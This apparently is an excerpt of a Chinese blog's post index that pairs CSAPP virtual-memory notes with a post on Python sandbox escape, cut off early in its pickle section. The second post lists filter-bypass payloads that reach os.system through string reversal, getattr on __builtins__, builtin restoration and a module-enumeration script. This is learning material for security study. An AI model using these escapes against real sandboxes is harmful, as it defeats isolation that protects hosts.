程序有良好的时间局部性，虚拟存储器都工作的相当好。 如果程序实在很烂，或者物理空间很小，工作集大于物理存储器大小。这种状态叫颠簸(thrashing). 这时，页面不断换进换出。性能十分低。 4、虚拟存储器作为内存管理的工具实际上，操作系统为每个进程提供一个独立的页表。 因此，VM简化了链接和加载,代码和数据共享,以及应用程序的存储器分配。 简化链接 独立的空间地址意味着每个进程的存储器映像使用相同的格式。 文本节总是从0x08048000(32位)处或0x400000(64位)处开始。 然后是数据，bss节,栈。 一致性极大简化了链接器的设计和实现。 简化加载 加载器可以从不实际拷贝任何数据从磁盘到存储器。 基本都是虚拟存储系统完成。 &gt; 将一组连续的`虚拟页`映射到任意一个文件中的任意位置的表示法称作`存储器映射`。Unix提供一个称为`mmap`的系统调用，允许程序自己做存储器映射。在9.8详细讲解。 简化共享 独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间的一致共享机制. 例子 操作相同的操作系统内核代码 C标准库的printf. 因此操作系统需要将不同进程的适当的虚拟页映射到相同的物理页面。 多个进程共享这部分代码的一个拷贝。 而不是每个进程都要加载单独的内核和C标准库的拷贝。 简化存储器分配. 即虚拟页连续(虚拟页还是单独的)，物理页可以不连续。使得分配更加容易。 简化保护. 我们可以通过为PTE添加额外的标识位提供对存储器的保护。通过新添加的三个标识位：SUP：内核or用户；READ: 5、地址翻译，加入高速缓存，多级页表， 案例研究：Intel CoreI7，这些东西太肝了，总结不出来，Orz,希望感兴趣的能自己认真看下去，因为这里如果要详讲只能把书扫描放这了，东西太多，所以直接科普一下Linux虚拟存储系统一个单独的Linux系统进程虚拟存储主要分为：内核虚拟存储器和进程虚拟存储器。我们主要来讲一下内核虚拟存储器：由下往上是内核的代码和数据结构，是每个进程共享的数据结构和代码；再往上是一组连续的虚拟页面映射到相应的物理页面的物理存储器，大小同主存一样大，提供很方便访问物理页面的任何位置。最后是每个进程不同的是页表、task（mm）、内核栈等。 5.1、虚拟存储器区域区域就是我们通常说的段，text、data、bss都是不同的区域，这些区域是被分为连续的片。每个虚拟页面都在不同的段中，不属于某个段的虚拟页面是不存在的，且不能被使用。我们来看看内核中的一个task数据结构（mm）：task_struct是位于内核虚拟存储器中对于每个进程的都不同的内核数据结构，包含运行该进程所需要的基本信息（PID、可执行文件名称、程序计数器等）。这个结构中有一个mm字段，指向的是mm_struct中的pgd和mmap，其中pgd是一级页表的基地址，mmap指向的是一个vm_area_structs的链表，每个该链表中的一个元素描述的是当前虚拟地址空间的一个段（text、data、bss等），当内核运行该进程的时候CR3寄存器就被放入了pgd。 5.2、Linux缺页异常处理我们将了解一些存储器区域划分的基础知识，并且介绍说mmap指向的是一个链表，这个链表中的每个元素都指向该进程的相应的段，其中vm_strat是段开始的地方，vm_end是段结束的地方。1&gt; 访问地址是否合法：缺页处理程序只需要将这个地址A与vm_area_struct链表中的每个元素的start和end数据比较，如果都没有的话，表示该地址不在相应的段中。就是一个段错误。2&gt; 保护异常：vm_area_struct中的vm_prot结构是包含了所有页面的读写权限，所以当对只有读权限的文本内容写入数据的时候，就会引发保护异常。3&gt; 最后，正常缺页。也就是相应的页面不在物理内存的时候，缺页程序就会锁定一个牺牲页面，将它的内容与实际需要的内容交换过来，当缺页程序返回的时候就可以正常的访问了。 6、存储器映射存储器映射是通过将磁盘上的一个文件与虚拟存储器中的一个区域关联起来的过程。 6.1、共享对象一个对象被映射到虚拟存储器的一个区域，这个区域要么是共享对象，要么是私有对象。如果一个进程A将一个共享对象映射X到了它的虚拟存储器中，那么对于也把这个共享对象X映射了的其他进程而言，进程A对共享对象X的任何读写操作都是可见的。下图是进程1和进程2映射了共享区域的图例：私有区域：即使是私有区域在物理存储器上也是同一个区域，如下图进程1和进程2所映射的私有对象在物理存储器上只是一份拷贝。每个对象都有唯一的一个文件名，在进程1的虚拟存储器中已经完成了私有对象到存储器的映射，进程2如果要映射这个区域只需要将页表条目指向已经映射好的物理存储器位置就行了。如上图所示，进程1和2将一个私有对象映射到了物理存储器的一个区域并共享这个私有对象。这个对象会被标记为只读，当其中一个进程2确实需要写这个区域的时候，就会引发一个保护故障，内核会在物理存储器中创建这个私有对象的一个拷贝，称为写时拷贝，更新页面条目使得进程1指向这个新的条目。然后把老对象修改为可写权限。这样当保护故障程序返回的时候，CPU重新执行写的操作就不会出错了。 6.2、再看fork函数当当前进程调用fork函数的时候，内核为新进程创建各种数据结构，并分配PID。为了给新进程创建一个虚拟存储器，它创建的当前进程的mm_struct、区域结构和页表的一个拷贝，内核为两个进程的每个页表标记为只读，并将诶个区域标记为私有的写时拷贝。这样当fork函数返回的时候，新进程的虚拟存储器和当前进程的虚拟存储器刚好相同。任何一个进程进行写操作的时候，才会创建新的页面。 7、动态内存分配（what is malloc?动态存储器分配指的是在程序运行的时候分配额外的存储空间，分配器维护着虚拟存储器中的堆实现这种分配。堆是紧跟着.bss段，并向上增长，内核维护着一个brk指针，指向堆的顶部。任何一个堆中的块要么是已分配的要么是空闲的。分配的方式分为两种：显式和隐式，我们接下来主要讲一下显示分配和实现一个分配器的基础知识，隐式分配指的其实是分配器回收空间，这个在分配器基础知识中有所讲解，就不再另外提出了： 7.1、显式分配：程序调用malloc和free函数经常直到我们的程序运行的时候，我们才知道某些数据结构的大小。这时候就必须显式的分配相应的存储空间。如下图所示：使用malloc函数以具体的输入内容分配相应大小的存储空间，函数原型如下：如果想要初始化存储器为0，可以使用calloc函数。想要改变已分配的大小可以使用realloc函数释放是通过调用free函数来实现的：ptr是指向一个已分配空间的起始位置 7.2、demo （a）请求一个4字大小的块，malloc将分配好的空间的首地址返回给p1；（b）请求一个5字大小的块，由于使用的双字对其，所以填充了一个空闲块；（c）请求一个6字大小的块，返回给p3；（d）释放p2，调用后p2仍然指向原来的位置；（e）请求一个2字大小的块，在已经释放的p2处优先分配，然后返回指针p4 7.3、配器基础知识分配器的目标主要是找到吞吐量和利用率的契合点，那么为什么需要隐式的分配，因为碎片的产生会降低存储空间的利用率碎片：内部和外部1&gt;内部碎片：我们上面讲到的（b）的情况，分配了一个额外的空闲块，实现双字对其； 2&gt;外部碎片：(e)中如果请求7字大小的块，即使存储空间有这么大，还是不行 当然，还有许多问题要思考，诸如：空闲块如何组织、如何分配新的块、怎么分割和合并块，这些技术都要求我们提供一种新的数据结构(更分配器更高级的骚操作以及垃圾回收，请自行看书吧)","link":"2019/01/13/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"},{"title":"Python沙箱和反序列化漏洞","text":"一、一些沙箱逃逸的姿势绕过姿势1.禁用import osimport osimport osimport os 2.过滤空格__import__(&apos;os&apos;).system(&quot;ls&quot;) import importlibimportlib.import_module(&apos;os&apos;).system(&apos;ls&apos;) 3.过滤importpython2 execfile(&apos;/usr/lib/python2.7/os.py&apos;)system(&apos;ls&apos;) 通用 with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f: exec(f.read())system(&apos;ls&apos;) 4、过滤os__import__(&apos;so&apos;[::-1]).system(&apos;ls&apos;) b = &apos;o&apos;a = &apos;s&apos;__import__(a+b).system(&apos;ls&apos;) 5、使用exec或者evaleval(&apos;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&apos;[::-1])exec(&apos;)&quot;imaohw&quot;(metsys.so ;so tropmi&apos;[::-1]) 6、恢复 sys.modules如何禁用的 sys.modules[&apos;os&apos;] = &apos;not allowed&apos;import osos.system(&apos;ls&apos;) 先删除重新导入-不能直接导入，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A del sys.modules[&apos;os&apos;]import osos.system(&apos;ls&apos;) 7、过滤system函数等价 print(os.system(&apos;whoami&apos;))print(os.popen(&apos;whoami&apos;).read()) 可以通过 getattr 拿到对象的方法、属性 import osgetattr(os, &apos;metsys&apos;[::-1])(&apos;whoami&apos;) 8、system,import,os都过滤了getattr(getattr(__builtins__, &apos;__tropmi__&apos;[::-1])(&apos;so&apos;[::-1]), &apos;metsys&apos;[::-1])(&apos;whoami&apos;) 一些常用payload常用操作import osos.system(&apos;ifconfig&apos;)os.popen(&apos;ipconfig&apos;).read()import commands #Linux python2commands.getoutput(&apos;ifconfig&apos;)commands.getstatusoutput(&apos;ifconfig&apos;)import subprocesssubprocess.call([&apos;ipconfig&apos;],shell=True)import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;, number=1)import platformplatform.os.system(&quot;ls&quot;)platform.popen(&apos;whoami&apos;, mode=&apos;r&apos;, bufsize=-1).read()import ptypty.spawn(&quot;ls&quot;)import cgicgi.os.system(&apos;ls&apos;) 查看路径 import sysprint(sys.path)print(sys.version) builtins、builtin与builtins -内建模块在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看但是，__builtins__ 两者都有，实际上是__builtin__和builtins 的引用 &gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &apos;__builtin__&apos; (built-in)&gt;&gt;&gt;&gt; __builtins__.__dict__列出了所有的 利用 &gt;&gt;&gt; &apos;__import__&apos; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;).system(&apos;whoami&apos;)macr0phag30&gt;&gt;&gt; &apos;eval&apos; in dir(__builtins__)True&gt;&gt;&gt; &apos;execfile&apos; in dir(__builtins__)True 删除危险函数操作 __builtins__.__dict__[&apos;eval&apos;] = &apos;not allowed&apos; del __builtins__.__dict__[&apos;eval&apos;] 但是我们可以利用 reload(__builtins__) 来恢复 __builtins__ 沙箱逃逸参考查看所有能利用模块 #-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity 库删掉all_modules_2 = [ &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;]all_modules_3 = [ &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;]methods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]results = {}for module in all_modules_3: results[module] = { &apos;flag&apos;: 0, &apos;result&apos;: {} } try: m = __import__(module) attrs = dir(m) for method in methods: if method in attrs: result = &apos;yes&apos; results[module][&apos;flag&apos;] = 1 else: result = &apos;no&apos; results[module][&apos;result&apos;][method] = result except Exception as e: print(e)for result in results: if results[result][&apos;flag&apos;]: print(&apos;[+]&apos; + result) for r in results[result][&apos;result&apos;]: print(&apos; [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r]) 一文看懂Python沙箱逃逸python安全和代码审计相关资料收集https://github.com/bit4woo/python_sechttps://kit4y.github.io/2019/11/19/flask-dao-ssti/ 二、python中的序列化与反序列化！python反序列化的类不需要提前声明 用于序列化的两个模块/pickle+json　　json：用于字符串和Python数据类型间进行转换　　pickle: 用于python特有的类型和python的数据类型间进行转换　　json提供四个功能：dumps,dump,loads,load　　pickle提供四个功能：dumps,dump,loads,load Pickle的支持类型1. 所有python支持的原生类型：布尔值，整数，浮点数，复数，字符串，字节，None。2. 由任何原生类型组成的列表，元组，字典和集合。3. 函数，类，类的实例 pickle模块中常用的方法有： pickle.dump(obj, file, protocol=None,)必填参数obj表示将要封装的对象必填参数file表示obj要写入的文件对象，file必须以二进制可写模式打开，即“wb”可选参数protocol表示告知pickler使用的协议，支持的协议有0,1,2,3，默认的协议是添加在Python 3中的协议3。　　　dump 将数据通过特殊的形式转换为只有python语言认识的字符串，并写入文件 with open(&apos;D:/tmp.pk&apos;, &apos;w&apos;) as f: pickle.dump(data, f) pickle.load(file,*,fix_imports=True, encoding=”ASCII”, 